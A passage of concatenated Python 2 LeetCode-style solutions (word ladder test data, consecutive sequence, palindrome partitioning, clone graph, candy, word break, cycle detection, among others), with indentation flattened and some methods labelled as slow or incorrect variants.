"dopy", "hock", "tour", "grip", "aldo", "whim", "prom", "rear", "dins", "duff", "dell", "loch", "lava", "sung",
"yank", "thar", "curl", "venn", "blow", "pomp", "heat", "trap", "dali", "nets", "seen", "gash", "twig", "dads",
"emmy", "rhea", "navy", "haws", "mite", "bows", "alas", "ives", "play", "soon", "doll", "chum", "ajar", "foam",
"call", "puke", "kris", "wily", "came", "ales", "reef", "raid", "diet", "prod", "prut", "loot", "soar", "coed",
"celt", "seam", "dray", "lump", "jags", "nods", "sole", "kink", "peso", "howl", "cost", "tsar", "uric", "sore",
"woes", "sewn", "sake", "cask", "caps", "burl", "tame", "bulk", "neva", "from", "meet", "webs", "spar", "fuck",
"buoy", "wept", "west", "dual", "pica", "sold", "seed", "gads", "riff", "neck", "deed", "rudy", "drop", "vale",
"flit", "romp", "peak", "jape", "jews", "fain", "dens", "hugo", "elba", "mink", "town", "clam", "feud", "fern",
"dung", "newt", "mime", "deem", "inti", "gigs", "sosa", "lope", "lard", "cara", "smug", "lego", "flex", "doth",
"paar", "moon", "wren", "tale", "kant", "eels", "muck", "toga", "zens", "lops", "duet", "coil", "gall", "teal",
"glib", "muir", "ails", "boer", "them", "rake", "conn", "neat", "frog", "trip", "coma", "must", "mono", "lira",
"craw", "sled", "wear", "toby", "reel", "hips", "nate", "pump", "mont", "died", "moss", "lair", "jibe", "oils",
"pied", "hobs", "cads", "haze", "muse", "cogs", "figs", "cues", "roes", "whet", "boru", "cozy", "amos", "tans",
"news", "hake", "cots", "boas", "tutu", "wavy", "pipe", "typo", "albs", "boom", "dyke", "wail", "woke", "ware",
"rita", "fail", "slab", "owes", "jane", "rack", "hell", "lags", "mend", "mask", "hume", "wane", "acne", "team",
"holy", "runs", "exes", "dole", "trim", "zola", "trek", "puma", "wacs", "veep", "yaps", "sums", "lush", "tubs",
"most", "witt", "bong", "rule", "hear", "awry", "sots", "nils", "bash", "gasp", "inch", "pens", "fies", "juts",
"pate", "vine", "zulu", "this", "bare", "veal", "josh", "reek", "ours", "cowl", "club", "farm", "teat", "coat",
"dish", "fore", "weft", "exam", "vlad", "floe", "beak", "lane", "ella", "warp", "goth", "ming", "pits", "rent",
"tito", "wish", "amps", "says", "hawk", "ways", "punk", "nark", "cagy", "east", "paul", "bose", "solo", "teed",
"text", "hews", "snip", "lips", "emit", "orgy", "icon", "tuna", "soul", "kurd", "clod", "calk", "aunt", "bake",
"copy", "acid", "duse", "kiln", "spec", "fans", "bani", "irma", "pads", "batu", "logo", "pack", "oder", "atop",
"funk", "gide", "bede", "bibs", "taut", "guns", "dana", "puff", "lyme", "flat", "lake", "june", "sets", "gull",
"hops", "earn", "clip", "fell", "kama", "seal", "diaz", "cite", "chew", "cuba", "bury", "yard", "bank", "byes",
"apia", "cree", "nosh", "judo", "walk", "tape", "taro", "boot", "cods", "lade", "cong", "deft", "slim", "jeri",
"rile", "park", "aeon", "fact", "slow", "goff", "cane", "earp", "tart", "does", "acts", "hope", "cant", "buts",
"shin", "dude", "ergo", "mode", "gene", "lept", "chen", "beta", "eden", "pang", "saab", "fang", "whir", "cove",
"perk", "fads", "rugs", "herb", "putt", "nous", "vane", "corm", "stay", "bids", "vela", "roof", "isms", "sics",
"gone", "swum", "wiry", "cram", "rink", "pert", "heap", "sikh", "dais", "cell", "peel", "nuke", "buss", "rasp",
"none", "slut", "bent", "dams", "serb", "dork", "bays", "kale", "cora", "wake", "welt", "rind", "trot", "sloe",
"pity", "rout", "eves", "fats", "furs", "pogo", "beth", "hued", "edam", "iamb", "glee", "lute", "keel", "airy",
"easy", "tire", "rube", "bogy", "sine", "chop", "rood", "elbe", "mike", "garb", "jill", "gaul", "chit", "dons",
"bars", "ride", "beck", "toad", "make", "head", "suds", "pike", "snot", "swat", "peed", "same", "gaza", "lent",
"gait", "gael", "elks", "hang", "nerf", "rosy", "shut", "glop", "pain", "dion", "deaf", "hero", "doer", "wost",
"wage", "wash", "pats", "narc", "ions", "dice", "quay", "vied", "eons", "case", "pour", "urns", "reva", "rags",
"aden", "bone", "rang", "aura", "iraq", "toot", "rome", "hals", "megs", "pond", "john", "yeps", "pawl", "warm",
"bird", "tint", "jowl", "gibe", "come", "hold", "pail", "wipe", "bike", "rips", "eery", "kent", "hims", "inks",
"fink", "mott", "ices", "macy", "serf", "keys", "tarp", "cops", "sods", "feet", "tear", "benz", "buys", "colo",
"boil", "sews", "enos", "watt", "pull", "brag", "cork", "save", "mint", "feat", "jamb", "rubs", "roxy", "toys",
"nosy", "yowl", "tamp", "lobs", "foul", "doom", "sown", "pigs", "hemp", "fame", "boor", "cube", "tops", "loco",
"lads", "eyre", "alta", "aged", "flop", "pram", "lesa", "sawn", "plow", "aral", "load", "lied", "pled", "boob",
"bert", "rows", "zits", "rick", "hint", "dido", "fist", "marc", "wuss", "node", "smog", "nora", "shim", "glut",
"bale", "perl", "what", "tort", "meek", "brie", "bind", "cake", "psst", "dour", "jove", "tree", "chip", "stud",
"thou", "mobs", "sows", "opts", "diva", "perm", "wise", "cuds", "sols", "alan", "mild", "pure", "gail", "wins",
"offs", "nile", "yelp", "minn", "tors", "tran", "homy", "sadr", "erse", "nero", "scab", "finn", "mich", "turd",
"then", "poem", "noun", "oxus", "brow", "door", "saws", "eben", "wart", "wand", "rosa", "left", "lina", "cabs",
"rapt", "olin", "suet", "kalb", "mans", "dawn", "riel", "temp", "chug", "peal", "drew", "null", "hath", "many",
"took", "fond", "gate", "sate", "leak", "zany", "vans", "mart", "hess", "home", "long", "dirk", "bile", "lace",
"moog", "axes", "zone", "fork", "duct", "rico", "rife", "deep", "tiny", "hugh", "bilk", "waft", "swig", "pans",
"with", "kern", "busy", "film", "lulu", "king", "lord", "veda", "tray", "legs", "soot", "ells", "wasp", "hunt",
"earl", "ouch", "diem", "yell", "pegs", "blvd", "polk", "soda", "zorn", "liza", "slop", "week", "kill", "rusk",
"eric", "sump", "haul", "rims", "crop", "blob", "face", "bins", "read", "care", "pele", "ritz", "beau", "golf",
"drip", "dike", "stab", "jibs", "hove", "junk", "hoax", "tats", "fief", "quad", "peat", "ream", "hats", "root",
"flak", "grit", "clap", "pugh", "bosh", "lock", "mute", "crow", "iced", "lisa", "bela", "fems", "oxes", "vies",
"gybe", "huff", "bull", "cuss", "sunk", "pups", "fobs", "turf", "sect", "atom", "debt", "sane", "writ", "anon",
"mayo", "aria", "seer", "thor", "brim", "gawk", "jack", "jazz", "menu", "yolk", "surf", "libs", "lets", "bans",
"toil", "open", "aced", "poor", "mess", "wham", "fran", "gina", "dote", "love", "mood", "pale", "reps", "ines",
"shot", "alar", "twit", "site", "dill", "yoga", "sear", "vamp", "abel", "lieu", "cuff", "orbs", "rose", "tank",
"gape", "guam", "adar", "vole", "your", "dean", "dear", "hebe", "crab", "hump", "mole", "vase", "rode", "dash",
"sera", "balk", "lela", "inca", "gaea", "bush", "loud", "pies", "aide", "blew", "mien", "side", "kerr", "ring",
"tess", "prep", "rant", "lugs", "hobo", "joke", "odds", "yule", "aida", "true", "pone", "lode", "nona", "weep",
"coda", "elmo", "skim", "wink", "bras", "pier", "bung", "pets", "tabs", "ryan", "jock", "body", "sofa", "joey",
"zion", "mace", "kick", "vile", "leno", "bali", "fart", "that", "redo", "ills", "jogs", "pent", "drub", "slaw",
"tide", "lena", "seep", "gyps", "wave", "amid", "fear", "ties", "flan", "wimp", "kali", "shun", "crap", "sage",
"rune", "logs", "cain", "digs", "abut", "obit", "paps", "rids", "fair", "hack", "huns", "road", "caws", "curt",
"jute", "fisk", "fowl", "duty", "holt", "miss", "rude", "vito", "baal", "ural", "mann", "mind", "belt", "clem",
"last", "musk", "roam", "abed", "days", "bore", "fuze", "fall", "pict", "dump", "dies", "fiat", "vent", "pork",
"eyed", "docs", "rive", "spas", "rope", "ariz", "tout", "game", "jump", "blur", "anti", "lisp", "turn", "sand",
"food", "moos", "hoop", "saul", "arch", "fury", "rise", "diss", "hubs", "burs", "grid", "ilks", "suns", "flea",
"soil", "lung", "want", "nola", "fins", "thud", "kidd", "juan", "heps", "nape", "rash", "burt", "bump", "tots",
"brit", "mums", "bole", "shah", "tees", "skip", "limb", "umps", "ache", "arcs", "raft", "halo", "luce", "bahs",
"leta", "conk", "duos", "siva", "went", "peek", "sulk", "reap", "free", "dubs", "lang", "toto", "hasp", "ball",
"rats", "nair", "myst", "wang", "snug", "nash", "laos", "ante", "opal", "tina", "pore", "bite", "haas", "myth",
"yugo", "foci", "dent", "bade", "pear", "mods", "auto", "shop", "etch", "lyly", "curs", "aron", "slew", "tyro",
"sack", "wade", "clio", "gyro", "butt", "icky", "char", "itch", "halt", "gals", "yang", "tend", "pact", "bees",
"suit", "puny", "hows", "nina", "brno", "oops", "lick", "sons", "kilo", "bust", "nome", "mona", "dull", "join",
"hour", "papa", "stag", "bern", "wove", "lull", "slip", "laze", "roil", "alto", "bath", "buck", "alma", "anus",
"evil", "dumb", "oreo", "rare", "near", "cure", "isis", "hill", "kyle", "pace", "comb", "nits", "flip", "clop",
"mort", "thea", "wall", "kiel", "judd", "coop", "dave", "very", "amie", "blah", "flub", "talc", "bold", "fogy",
"idea", "prof", "horn", "shoo", "aped", "pins", "helm", "wees", "beer", "womb", "clue", "alba", "aloe", "fine",
"bard", "limo", "shaw", "pint", "swim", "dust", "indy", "hale", "cats", "troy", "wens", "luke", "vern", "deli",
"both", "brig", "daub", "sara", "sued", "bier", "noel", "olga", "dupe", "look", "pisa", "knox", "murk", "dame",
"matt", "gold", "jame", "toge", "luck", "peck", "tass", "calf", "pill", "wore", "wadi", "thur", "parr", "maul",
"tzar", "ones", "lees", "dark", "fake", "bast", "zoom", "here", "moro", "wine", "bums", "cows", "jean", "palm",
"fume", "plop", "help", "tuba", "leap", "cans", "back", "avid", "lice", "lust", "polo", "dory", "stew", "kate",
"rama", "coke", "bled", "mugs", "ajax", "arts", "drug", "pena", "cody", "hole", "sean", "deck", "guts", "kong",
"bate", "pitt", "como", "lyle", "siam", "rook", "baby", "jigs", "bret", "bark", "lori", "reba", "sups", "made",
"buzz", "gnaw", "alps", "clay", "post", "viol", "dina", "card", "lana", "doff", "yups", "tons", "live", "kids",
"pair", "yawl", "name", "oven", "sirs", "gyms", "prig", "down", "leos", "noon", "nibs", "cook", "safe", "cobb",
"raja", "awes", "sari", "nerd", "fold", "lots", "pete", "deal", "bias", "zeal", "girl", "rage", "cool", "gout",
"whey", "soak", "thaw", "bear", "wing", "nagy", "well", "oink", "sven", "kurt", "etna", "held", "wood", "high",
"feta", "twee", "ford", "cave", "knot", "tory", "ibis", "yaks", "vets", "foxy", "sank", "cone", "pius", "tall",
"seem", "wool", "flap", "gird", "lore", "coot", "mewl", "sere", "real", "puts", "sell", "nuts", "foil", "lilt",
"saga", "heft", "dyed", "goat", "spew", "daze", "frye", "adds", "glen", "tojo", "pixy", "gobi", "stop", "tile",
"hiss", "shed", "hahn", "baku", "ahas", "sill", "swap", "also", "carr", "manx", "lime", "debs", "moat", "eked",
"bola", "pods", "coon", "lacy", "tube", "minx", "buff", "pres", "clew", "gaff", "flee", "burn", "whom", "cola",
"fret", "purl", "wick", "wigs", "donn", "guys", "toni", "oxen", "wite", "vial", "spam", "huts", "vats", "lima",
"core", "eula", "thad", "peon", "erie", "oats", "boyd", "cued", "olaf", "tams", "secs", "urey", "wile", "penn",
"bred", "rill", "vary", "sues", "mail", "feds", "aves", "code", "beam", "reed", "neil", "hark", "pols", "gris",
"gods", "mesa", "test", "coup", "heed", "dora", "hied", "tune", "doze", "pews", "oaks", "bloc", "tips", "maid",
"goof", "four", "woof", "silo", "bray", "zest", "kiss", "yong", "file", "hilt", "iris", "tuns", "lily", "ears",
"pant", "jury", "taft", "data", "gild", "pick", "kook", "colt", "bohr", "anal", "asps", "babe", "bach", "mash",
"biko", "bowl", "huey", "jilt", "goes", "guff", "bend", "nike", "tami", "gosh", "tike", "gees", "urge", "path",
"bony", "jude", "lynn", "lois", "teas", "dunn", "elul", "bonn", "moms", "bugs", "slay", "yeah", "loan", "hulk",
"lows", "damn", "nell", "jung", "avis", "mane", "waco", "loin", "knob", "tyke", "anna", "hire", "luau", "tidy",
"nuns", "pots", "quid", "exec", "hans", "hera", "hush", "shag", "scot", "moan", "wald", "ursa", "lorn", "hunk",
"loft", "yore", "alum", "mows", "slog", "emma", "spud", "rice", "worn", "erma", "need", "bags", "lark", "kirk",
"pooh", "dyes", "area", "dime", "luvs", "foch", "refs", "cast", "alit", "tugs", "even", "role", "toed", "caph",
"nigh", "sony", "bide", "robs", "folk", "daft", "past", "blue", "flaw", "sana", "fits", "barr", "riot", "dots",
"lamp", "cock", "fibs", "harp", "tent", "hate", "mali", "togs", "gear", "tues", "bass", "pros", "numb", "emus",
"hare", "fate", "wife", "mean", "pink", "dune", "ares", "dine", "oily", "tony", "czar", "spay", "push", "glum",
"till", "moth", "glue", "dive", "scad", "pops", "woks", "andy", "leah", "cusp", "hair", "alex", "vibe", "bulb",
"boll", "firm", "joys", "tara", "cole", "levy", "owen", "chow", "rump", "jail", "lapp", "beet", "slap", "kith",
"more", "maps", "bond", "hick", "opus", "rust", "wist", "shat", "phil", "snow", "lott", "lora", "cary", "mote",
"rift", "oust", "klee", "goad", "pith", "heep", "lupe", "ivan", "mimi", "bald", "fuse", "cuts", "lens", "leer",
"eyry", "know", "razz", "tare", "pals", "geek", "greg", "teen", "clef", "wags", "weal", "each", "haft", "nova",
"waif", "rate", "katy", "yale", "dale", "leas", "axum", "quiz", "pawn", "fend", "capt", "laws", "city", "chad",
"coal", "nail", "zaps", "sort", "loci", "less", "spur", "note", "foes", "fags", "gulp", "snap", "bogs", "wrap",
"dane", "melt", "ease", "felt", "shea", "calm", "star", "swam", "aery", "year", "plan", "odin", "curd", "mira",
"mops", "shit", "davy", "apes", "inky", "hues", "lome", "bits", "vila", "show", "best", "mice", "gins", "next",
"roan", "ymir", "mars", "oman", "wild", "heal", "plus", "erin", "rave", "robe", "fast", "hutu", "aver", "jodi",
"alms", "yams", "zero", "revs", "wean", "chic", "self", "jeep", "jobs", "waxy", "duel", "seek", "spot", "raps",
"pimp", "adan", "slam", "tool", "morn", "futz", "ewes", "errs", "knit", "rung", "kans", "muff", "huhs", "tows",
"lest", "meal", "azov", "gnus", "agar", "sips", "sway", "otis", "tone", "tate", "epic", "trio", "tics", "fade",
"lear", "owns", "robt", "weds", "five", "lyon", "terr", "arno", "mama", "grey", "disk", "sept", "sire", "bart",
"saps", "whoa", "turk", "stow", "pyle", "joni", "zinc", "negs", "task", "leif", "ribs", "malt", "nine", "bunt",
"grin", "dona", "nope", "hams", "some", "molt", "smit", "sacs", "joan", "slav", "lady", "base", "heck", "list",
"take", "herd", "will", "nubs", "burg", "hugs", "peru", "coif", "zoos", "nick", "idol", "levi", "grub", "roth",
"adam", "elma", "tags", "tote", "yaws", "cali", "mete", "lula", "cubs", "prim", "luna", "jolt", "span", "pita",
"dodo", "puss", "deer", "term", "dolt", "goon", "gary", "yarn", "aims", "just", "rena", "tine", "cyst", "meld",
"loki", "wong", "were", "hung", "maze", "arid", "cars", "wolf", "marx", "faye", "eave", "raga", "flow", "neal",
"lone", "anne", "cage", "tied", "tilt", "soto", "opel", "date", "buns", "dorm", "kane", "akin", "ewer", "drab",
"thai", "jeer", "grad", "berm", "rods", "saki", "grus", "vast", "late", "lint", "mule", "risk", "labs", "snit",
"gala", "find", "spin", "ired", "slot", "oafs", "lies", "mews", "wino", "milk", "bout", "onus", "tram", "jaws",
"peas", "cleo", "seat", "gums", "cold", "vang", "dewy", "hood", "rush", "mack", "yuan", "odes", "boos", "jami",
"mare", "plot", "swab", "borg", "hays", "form", "mesh", "mani", "fife", "good", "gram", "lion", "myna", "moor",
"skin", "posh", "burr", "rime", "done", "ruts", "pays", "stem", "ting", "arty", "slag", "iron", "ayes", "stub",
"oral", "gets", "chid", "yens", "snub", "ages", "wide", "bail", "verb", "lamb", "bomb", "army", "yoke", "gels",
"tits", "bork", "mils", "nary", "barn", "hype", "odom", "avon", "hewn", "rios", "cams", "tact", "boss", "oleo",
"duke", "eris", "gwen", "elms", "deon", "sims", "quit", "nest", "font", "dues", "yeas", "zeta", "bevy", "gent",
"torn", "cups", "worm", "baum", "axon", "purr", "vise", "grew", "govs", "meat", "chef", "rest", "lame"])
) == 11
class Solution:
def longestConsecutive_TLE(self, num):
length = len(num)
inverted_table = dict(zip(num, range(length)))
max_length = -1<<31
for ind, val in enumerate(num):
current_length = 1
sequence_val_expected = val-1
while sequence_val_expected in inverted_table:
sequence_val_expected -= 1
current_length += 1
sequence_val_expected = val+1
while sequence_val_expected in inverted_table:
sequence_val_expected += 1
current_length += 1
max_length = max(max_length, current_length)
return max_length
def longestConsecutive(self, num):
visited = {item: False for item in num}
max_length = -1<<31
for ind, val in enumerate(num):
if visited[val]: continue
current_length = 1
sequence_val_expected = val-1
while sequence_val_expected in visited:
visited[sequence_val_expected] = True
sequence_val_expected -= 1
current_length += 1
sequence_val_expected = val+1
while sequence_val_expected in visited:
visited[sequence_val_expected] = True
sequence_val_expected += 1
current_length += 1
max_length = max(max_length, current_length)
return max_length
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def sumNumbers(self, root):
result = []
self.dfs(root, "", result)
result = [int(element) for element in result]
return sum(result)
def dfs(self, root, cur, result):
if not root:
return
cur = cur+str(root.val)
if not root.left and not root.right:
result.append(cur)
return
if root.left:
self.dfs(root.left, cur, result)
if root.right:
self.dfs(root.right, cur, result)
def dfs_error(self, root, cur, result):
if not root:
return
cur.append(root.val)
if not root.left and not root.right:
result.append(cur)
return
if root.left:
self.dfs_error(root.left, cur, result)
if root.right:
self.dfs_error(root.right, cur, result)
if __name__=="__main__":
nodes = [TreeNode(0), TreeNode(1), TreeNode(3)]
nodes[0].left = nodes[1]
nodes[0].right = nodes[2]
Solution().sumNumbers(nodes[0])
CONNECTED = 'C'
directions = [(1, 0), (-1, 0), (0, 1), (0, -1)]
class Solution:
def solve(self, board):
if not board or not board[0]:
return
q = []
m = len(board)
n = len(board[0])
for i in xrange(m):
if board[i][0]=='O': q.append((i, 0))
if board[i][n-1]=='O': q.append((i, n-1))
for j in xrange(1, n-1):
if board[0][j]=='O': q.append((0, j))
if board[m-1][j]=='O': q.append((m-1, j))
while q:
cor = q.pop()
board[cor[0]][cor[1]]=CONNECTED
for direction in directions:
row = cor[0]+direction[0]
col = cor[1]+direction[1]
if 0<=row<m and 0<=col<n and board[row][col]=='O':
q.append((row, col))
for i in xrange(m):
for j in xrange(n):
if board[i][j]=='O':
board[i][j] = 'X'
elif board[i][j]==CONNECTED:
board[i][j] = 'O'
if __name__=="__main__":
board = [
['X', 'X', 'X', 'X'],
['X', 'O', 'O', 'X'],
['X', 'X', 'O', 'X'],
['X', 'O', 'X', 'X']
]
expected_board = [
['X', 'X', 'X', 'X'],
['X', 'X', 'X', 'X'],
['X', 'X', 'X', 'X'],
['X', 'O', 'X', 'X']
]
Solution().solve(board)
assert board==expected_board
class Solution:
def partition(self, s):
result = []
self.get_partition(s, [], result)
return result
def get_partition(self, seq, cur, result):
if not seq:
result.append(cur)
for i in xrange(len(seq)):
if self.is_palindrome(seq[:i+1]):
self.get_partition(seq[i+1:], cur+[seq[:i+1]], result)
def is_palindrome(self, s):
return s == s[::-1]
if __name__=="__main__":
assert Solution().partition("aab")==[['a', 'a', 'b'], ['aa', 'b']]
class Solution(object):
def minCut(self, s):
n = len(s)
P = [[False for _ in xrange(n+1)] for _ in xrange(n+1)]
for i in xrange(n+1):
P[i][i] = True
for i in xrange(n):
P[i][i+1] = True
for i in xrange(n, -1, -1):
for j in xrange(i+2, n+1):
P[i][j] = P[i+1][j-1] and s[i] == s[j-1]
C = [i for i in xrange(n+1)]
for i in xrange(n+1):
if P[0][i]:
C[i] = 0
else:
C[i] = min(
C[j] + 1
for j in xrange(i)
if P[j][i]
)
return C[n]
def minCut_dp(self, s):
if not s:
return 0
length = len(s)
P = [[False for _ in xrange(length+1)] for _ in xrange(length+1)]
for i in xrange(length+1):
try:
P[i][i] = True
P[i][i+1] = True
except IndexError:
pass
for i in xrange(length, -1, -1):
for j in xrange(i+2, length+1):
try:
P[i][j] = P[i+1][j-1] and s[i] == s[j-1]
except IndexError:
P[i][j] = True
D = [length-i-1 for i in xrange(length)]
for i in xrange(length-1, -1, -1):
if P[i][length]:
D[i] = 0
else:
for j in xrange(i+1, length):
if P[i][j]:
D[i] = min(D[i], D[j]+1)
return D[0]
def minCut_MLE(self, s):
q = [[s]]
count = -1
while q:
length = len(q)
count += 1
for cur_level in xrange(length):
cur = q[cur_level]
if all(self.is_palindrome(item) for item in cur):
return count
for ind, val in enumerate(cur):
for i in xrange(1, len(val)):
cut1 = val[:i]
cut2 = val[i:]
new_cur = list(cur)
new_cur[ind] = cut1
new_cur.insert(ind+1, cut2)
q.append(new_cur)
q = q[length:]
def minCut_TLE(self, s):
if not s:
return 0
length = len(s)
dp = [[1<<32-1 for _ in xrange(length+1)] for _ in xrange(length+1)]
for i in xrange(length+1):
try:
dp[i][i] = 0
dp[i][i+1] = 0
except IndexError:
pass
for i in xrange(length, -1, -1):
for k in xrange(i, length+1):
if self.is_palindrome(s[i:k]):
dp[i][k] = 0
else:
dp[i][k] = min(1+dp[i][j]+dp[j][k] for j in xrange(i+1, k))
return dp[0][length]
def is_palindrome(self, s):
return s == s[::-1]
def minCut_TLE2(self, s):
if not s:
return 0
length = len(s)
dp2 = [[False for _ in xrange(length+1)] for _ in xrange(length+1)]
for i in xrange(length+1):
try:
dp2[i][i] = True
dp2[i][i+1] = True
except IndexError:
pass
for i in xrange(length, -1, -1):
for j in xrange(i+2, length+1):
try:
dp2[i][j] = dp2[i+1][j-1] and s[i] == s[j-1]
except IndexError:
dp2[i][j] = True
dp = [[1<<32-1 for _ in xrange(length+1)] for _ in xrange(length+1)]
for i in xrange(length+1):
try:
dp[i][i] = 0
dp[i][i+1] = 0
except IndexError:
pass
for i in xrange(length, -1, -1):
for k in xrange(i, length+1):
if dp2[i][k]:
dp[i][k] = 0
else:
dp[i][k] = min(1+dp[i][j]+dp[j][k] for j in xrange(i+1, k))
return dp[0][length]
if __name__ == "__main__":
assert Solution().minCut("aabbc") == 2
assert Solution().minCut(
"apjesgpsxoeiokmqmfgvjslcjukbqxpsobyhjpbgdfruqdkeiszrlmtwgfxyfostpqczidfljwfbbrflkgdvtytbgqalguewnhvvmcgxboycffopmtmhtfizxkmeftcucxpobxmelmjtuzigsxnncxpaibgpuijwhankxbplpyejxmrrjgeoevqozwdtgospohznkoyzocjlracchjqnggbfeebmuvbicbvmpuleywrpzwsihivnrwtxcukwplgtobhgxukwrdlszfaiqxwjvrgxnsveedxseeyeykarqnjrtlaliyudpacctzizcftjlunlgnfwcqqxcqikocqffsjyurzwysfjmswvhbrmshjuzsgpwyubtfbnwajuvrfhlccvfwhxfqthkcwhatktymgxostjlztwdxritygbrbibdgkezvzajizxasjnrcjwzdfvdnwwqeyumkamhzoqhnqjfzwzbixclcxqrtniznemxeahfozp") == 452
class UndirectedGraphNode:
def __init__(self, x):
self.label = x
self.neighbors = []
def __repr__(self):
return repr(self.label)
class Solution:
def cloneGraph_TLE(self, node):
return self.clone_graph_visited(node, set())
def clone_graph_visited(self, node, visited_set):
if not node:
return
visited_set.add(node)
neighbors_cloned = [self.clone_graph_visited(neighbor, set(visited_set)) for neighbor in node.neighbors if neighbor not in visited_set]
node_cloned = UndirectedGraphNode(node.label)
for neighbor_cloned in neighbors_cloned:
if neighbor_cloned not in visited_set:
neighbor_cloned.neighbors.append(node_cloned)
node_cloned.neighbors = neighbors_cloned
return node_cloned
def cloneGraph(self, node):
if not node:
return
original2copy = {}
q = [node]
clone = UndirectedGraphNode(node.label)
original2copy[node] = clone
while q:
cur = q.pop()
for neighbor in cur.neighbors:
if neighbor in original2copy:
original2copy[cur].neighbors.append(original2copy[neighbor])
else:
q.append(neighbor)
clone_neighbor = UndirectedGraphNode(neighbor.label)
original2copy[neighbor] = clone_neighbor
original2copy[cur].neighbors.append(original2copy[neighbor])
return original2copy[node]
if __name__=="__main__":
lst = [UndirectedGraphNode(i+1) for i in range(3)]
for item in lst:
item.neighbors = list(lst)
item.neighbors.remove(item)
cloned = Solution().cloneGraph(lst[0])
assert cloned.neighbors[0].label in (2, 3)
assert cloned.neighbors[1].label in (2, 3)
class Solution:
def canCompleteCircuit(self, gas, cost):
length = len(gas)
diff = [gas[i]-cost[i] for i in xrange(length)]
if sum(diff)<0:
return -1
start_index = 0
sum_before = 0
for ind, val in enumerate(diff):
sum_before += val
if sum_before<0:
start_index = ind+1
sum_before = 0
return start_index
if __name__=="__main__":
Solution().canCompleteCircuit([5], [4])
class Solution:
def candy(self, ratings):
length = len(ratings)
dp = [-1 for _ in xrange(length)]
dp[0] = 1
for ind in xrange(1, length):
val = ratings[ind]
if ratings[ind-1]<val:
dp[ind] = dp[ind-1]+1
elif ratings[ind-1]>val:
dp[ind] = dp[ind-1]-1
else:
dp[ind] = 1
if ind+1<length and ratings[ind-1]>val and val<=ratings[ind+1]:
self.re_adjust(ratings, dp, ind)
if ratings[length-2]>ratings[length-1]:
self.re_adjust(ratings, dp, length-1)
return sum(dp)
def re_adjust(self, ratings, dp, ind):
original = dp[ind]
if original==1: return
i = ind
candy = 1
while i>0 and ratings[i-1]>ratings[i]:
dp[i] = candy
candy += 1
i -= 1
if original<1:
dp[i] = candy
if __name__=="__main__":
assert Solution().candy([58,21,72,77,48,9,38,71,68,77,82,47,25,94,89,54,26,54,54,99,64,71,76,63,81,82,60,64,29,51,87,87,72,12,16,20,21,54,43,41,83,77,41,61,72,82,15,50,36,69,49,53,92,77,16,73,12,28,37,41,79,25,80,3,37,48,23,10,55,19,51,38,96,92,99,68,75,14,18,63,35,19,68,28,49,36,53,61,64,91,2,43,68,34,46,57,82,22,67,89])==208
assert Solution().candy([4, 2, 3, 4, 1])==9
assert Solution().candy([1, 4, 3, 2, 1])==11
assert Solution().candy([8, 7, 6, 5, 4, 3, 2, 1])==36
class Solution:
def singleNumber(self, A):
storage = 0
for element in A:
storage ^= element
return storage
class Solution:
def singleNumber_optimal(self, A):
bit_0, bit_1, bit_2 = ~0, 0, 0
for elmt in A:
bit_t = bit_2
bit_2 = (bit_1 & elmt) | (bit_2 & ~elmt)
bit_1 = (bit_0 & elmt) | (bit_1 & ~elmt)
bit_0 = (bit_t & elmt) | (bit_0 & ~elmt)
return bit_1
def singleNumber_array(self, A):
cnt = [0 for _ in xrange(32)]
for elmt in A:
for i in xrange(32):
if elmt>>i&1==1:
cnt[i] = (cnt[i]+1)%3
result = 0
for i in xrange(32):
result |= cnt[i]<<i
return result
def singleNumber(self, A):
one, two, three = 0, 0, 0
for elmt in A:
two |= one&elmt
one ^= elmt
three = one&two
one &= ~three
two &= ~three
return one
if __name__=="__main__":
tests = [
[1, 1, 1, 2, 2, 2, 3, 4, 4, 4],
[1]
]
for A in tests:
assert Solution().singleNumber_optimal(A)==Solution().singleNumber_array(A)
assert Solution().singleNumber_optimal(A)==Solution().singleNumber(A)
class RandomListNode:
def __init__(self, x):
self.label = x
self.next = None
self.random = None
class Solution:
def copyRandomList(self, head):
dummy = RandomListNode(0)
dummy.next = head
pre = dummy
while pre.next:
cur = pre.next
cur_copy = RandomListNode(cur.label)
temp = cur.next
cur.next = cur_copy
cur_copy.next = temp
pre = pre.next.next
pre = dummy
while pre.next:
cur = pre.next
if cur.random:
cur.next.random = cur.random.next
pre = pre.next.next
pre = dummy
head_copy = pre.next.next if pre.next else None
while pre.next:
cur = pre.next
cur_copy = cur.next
cur.next = cur_copy.next
if cur_copy.next:
cur_copy.next = cur_copy.next.next
pre = pre.next
return head_copy
class Solution:
def wordBreak_TLE(self, s, dict):
string_builder = ""
if s=="":
return True
for i in range(len(s)):
string_builder += s[i]
if string_builder in dict:
try:
if self.wordBreak_TLE(s[i+1:], dict):
return True
else:
continue
except IndexError:
return True
return False
def wordBreak(self, s, dict):
dp = [False] * (len(s)+1)
dp[0] = True
for i in range(len(dp)):
if dp[i]:
for word in dict:
try:
if dp[i+len(word)]==True:
continue
if s[i:i+len(word)]==word:
dp[i+len(word)] = True
except IndexError:
continue
return dp[-1]
if __name__=="__main__":
assert Solution().wordBreak("aaaaaaa", ["aaaa", "aaa"])==True
from collections import deque
class Solution:
def wordBreak(self, s, dict):
dp = [[] for _ in range(len(s) + 1)]
dp[0].append("dummy")
for i in range(len(s)):
if not dp[i]:
continue
for word in dict:
if s[i:i + len(word)] == word:
dp[i + len(word)].append(word)
if not dp[-1]:
return []
result = []
self.build_result(dp, len(s), deque(), result)
return result
def build_result(self, dp, cur_index, cur_sentence, result):
if cur_index == 0:
result.append(" ".join(cur_sentence))
return
for prefix in dp[cur_index]:
cur_sentence.appendleft(prefix)
self.build_result(dp, cur_index - len(prefix), cur_sentence, result)
cur_sentence.popleft()
if __name__=="__main__":
assert Solution().wordBreak("catsanddog", ["cat", "cats", "and", "sand", "dog"])==['cat sand dog', 'cats and dog']
class ListNode:
def __init__(self, x):
self.val = x
self.next = None
class Solution:
def hasCycle(self, head):
hare = head
tortoise = head
while hare and hare.next and tortoise:
hare = hare.next.next
tortoise = tortoise.next
if hare==tortoise:
return True
return False
class ListNode:
def __init__(self, x):
self.val = x
self.next = None
class Solution:
def detectCycle(self, head):
hare = head
tortoise = head
flag = False
while hare and hare.next and tortoise:
hare = hare.next.next
tortoise = tortoise.next
if hare==tortoise:
flag = True
break
if not flag:
return None
cur = head
while cur:
if cur==tortoise:
break
cur = cur.next
tortoise = tortoise.next
return cur
class ListNode:
def __init__(self, x):
self.val = x
self.next = None
def __repr__(self):
return repr(self.val)
class Solution:
def reorderList_TLE(self, head):
dummy_head = ListNode(0)
